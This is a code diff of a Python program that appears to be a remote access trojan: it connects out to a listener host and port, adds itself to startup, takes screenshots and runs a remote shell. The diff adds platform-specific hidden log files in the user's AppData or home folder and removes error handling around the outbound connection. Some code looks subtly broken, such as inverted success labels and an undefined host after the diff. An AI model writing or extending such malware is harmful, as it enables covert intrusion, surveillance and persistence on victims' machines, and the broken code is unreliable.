@@ -1,5 +1,5 @@
-lhost="192.168.100.21"
-lport="8989"
+lport="3434"
+import platform
 import socket
 import time
 import subprocess
@@ -10,7 +10,15 @@ from mss import mss
 
 
 def log(data , ERROR=False):
+    def linux():
+        if ERROR:
+            with open("~/.logs.txt", "a+") as l:
+                l.write(f"[Success] {data}\n")
 
+        else:
+            with open("~/.logs.txt", "a+") as l:
+                l.write(f"[Failed] {data}\n")
+    def windows():
         file = "logs.txt"
         hide_path = f"C:/Users/{os.getlogin()}/AppData/Roaming/"
         if ERROR:
@@ -21,6 +29,11 @@ def log(data , ERROR=False):
             with open(hide_path+file, "a+") as l:
                 l.write(f"[Failed] {data}\n")
 
+
+    if "Windows" in platform.platform():
+        windows()
+    else:
+        linux()
 
 
 def AddToStart():
@@ -129,7 +142,4 @@ def shell():
 
 
 s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-try:
-    connection(lhost, lport)
-except:
-    pass
+connection(lhost , lport)
